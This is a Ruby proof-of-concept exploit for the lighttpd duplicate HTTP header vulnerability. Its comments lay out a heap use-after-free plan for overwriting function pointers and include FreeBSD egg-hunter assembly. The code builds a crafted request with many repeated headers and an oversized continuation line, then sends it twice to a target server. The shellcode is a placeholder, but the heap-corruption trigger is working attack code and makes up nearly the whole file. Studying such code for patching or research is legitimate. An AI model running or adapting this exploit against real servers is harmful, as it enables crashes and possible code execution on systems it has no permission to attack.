#!/usr/bin/ruby

=begin
   lighttpd Duplicate HTTP Header Vulnerability PoC Exploit
   Ref: http://www.lighthttpd.net/assets/2007/7/24/lighttpd_sa2007_03.txt
=end

=begin
   Pass1: Dig the heap and fill it up with our data
   Pass2: Copy our data on dangling ptr (ds is free'd by array_insert_unique in case of duplicate key)
          *make sure realloc is not triggered in buffer_prepare_append*
   Pass3: Dummy connect to allocate new data_string on heap with function pointers
   Pass4: Attempt to copy *BIG* data on dangling ptr (need realloc corruption bypass) and overwrite function
          pointers
          close connection
          *triggered pwn*

          * I HATE REALLOC *
=end

#
# FreeBSD Hunter
# 
# mov eax, $TAG
# mov ebx, $HIGH
# mov edx, $LOW
#
# mov ecx, edx
# p_A:
# cmp edx, ecx
# jl o_A
# cmp dword [ecx], $TAG
# jz c_A
# jmp lc_A
# c_A:
# call ecx
# lc_A:
# loop p_A
# o_A:
# xor eax, eax
# inc eax
# push byte al
# push byte SYS_exit
# int 0x80
#
shellcode = ("A" * 50) + ("\xcc" * 10)

if __FILE__ == $0
   require 'socket'
   host = ARGV[0] || '127.0.0.1'
   port = ARGV[1] || 80

   request = String.new
   request << "GET / HTTP/1.1\r\n"
   request << "Host: #{host}:#{port}\r\n"
   #request << "User-Agent: pwner buffer\r\n"
   request << "User-Agent: #{'P'*100}\r\n"
   request << "Dummy1: #{'P'*32}\r\n"
   request << "Dummy2: #{'P'*32}\r\n"
   request << "Dummy3: #{'P'*32}\r\n"
   request << "Dummy4: #{'P'*32}\r\n"
   request << "Dummy5: #{'P'*32}\r\n"
   request << "Dummy6: #{'P'*32}\r\n"
   request << "Dummy7: #{'P'*32}\r\n"
   request << "Dummy8: #{'P'*32}\r\n"
   request << "Dummy9: #{'P'*32}\r\n"
   request << "Dummy10: #{'P'*32}\r\n"
   request << "Dummy11: #{'P'*32}\r\n"
   request << "Dummy12: #{'P'*32}\r\n"
   request << "Dummy13: #{'P'*32}\r\n"
   request << "Dummy14: #{'P'*32}\r\n"
   request << "Dummy15: #{'P'*32}\r\n"
   request << "Dummy16: #{'P'*32}\r\n"
   request << "Dummy17: #{'P'*32}\r\n"
   request << "Dummy18: #{'P'*32}\r\n"
   request << "Dummy19: #{'P'*32}\r\n"
   request << "User-Agent: P\r\n"
   request << "  AABBBBCCCCDDDDEEEEFFFFGGGGPPPAAAABBBBCCCCPPPXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
   #request << "  AABBBBCCCCDDDDEEEEFFFFGGGGPPPAAAABBBBCCCCPPP\r\n" # trigger on realloc
   request << "Connection: keep-alive\r\n"
   request << "\r\n\r\n"
   
   puts "Exploiting #{host}:#{port}"
   sock = TCPSocket.new(host, port.to_i)
   puts "sending req1"
   sock.send(request, request.length)
   sock.readline
   puts "sending req2"
   sock.send(request, request.length)
   sock.readline
   sock.close
end
